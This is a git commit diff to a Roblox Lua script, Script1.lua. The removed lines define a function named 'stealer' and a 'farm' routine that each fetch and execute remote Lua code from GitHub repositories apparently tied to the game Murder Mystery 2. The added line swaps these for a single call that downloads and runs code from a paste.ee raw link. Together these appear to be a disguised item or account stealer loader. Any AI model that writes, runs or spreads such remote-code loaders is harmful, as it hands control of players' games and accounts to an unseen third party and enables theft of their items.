efc8725fb0fa4d2f95a974888fc73760062649d5
ScriptLast <hadikusumah012@gmail.com>
2025-06-02 17:37:55 +0700

    Update Script1.lua

--- Script1.lua
+++ Script1.lua
@@ -1,13 +1,1 @@
-local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/MurderMastery2/refs/heads/main/Script.lua'))()
-end
-
-local function farm()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/mm2loadingscrenn/refs/heads/main/script.lua'))()
-end
-
-task.spawn(stealer)
-
-for i = 1, 1 do
-    task.spawn(farm)
-end
+loadstring(game:HttpGet("https://paste.ee/r/UaWq4Imd"))()
